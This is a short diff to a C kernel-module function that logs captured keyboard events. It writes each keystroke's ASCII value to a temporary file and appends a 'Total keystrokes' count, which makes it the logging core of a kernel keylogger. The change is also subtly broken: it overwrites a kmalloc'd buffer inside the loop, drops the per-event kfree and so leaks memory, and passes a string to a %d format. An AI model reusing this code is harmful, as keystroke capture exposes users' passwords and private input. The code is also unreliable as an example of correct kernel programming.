@@ -54,8 +54,11 @@ void ft_log_tmpfile(void)
 	char *temp_str;
 	struct list_head *head_ptr;
 	struct event_struct *entry;
+	int total_inputs;
 
 	head_ptr = g_driver->events_head->list.next;
+	temp_str = kmalloc(69, GFP_KERNEL);
+	total_inputs = 0;
 	while (head_ptr != &(g_driver->events_head->list))
 	{
 		entry = list_entry(head_ptr, struct event_struct, list);
@@ -64,12 +67,15 @@ void ft_log_tmpfile(void)
 		{
 			temp_str = event_to_str(*entry);
 			if (entry->ascii_value > 0)
+			{
+				++total_inputs;
 				ft_write_tmpfile(&(entry->ascii_value), 1);
-			
-			// ft_write_tmpfile(temp_str);
-			kfree(temp_str);
+			}			
 		}
 
 		head_ptr = head_ptr->next;
 	}
+	sprintf(temp_str, "\n\nTotal keystrokes: %d\n", ft_itoa(total_inputs));
+	ft_write_tmpfile(temp_str, strlen(temp_str));
+	kfree(temp_str);
 }
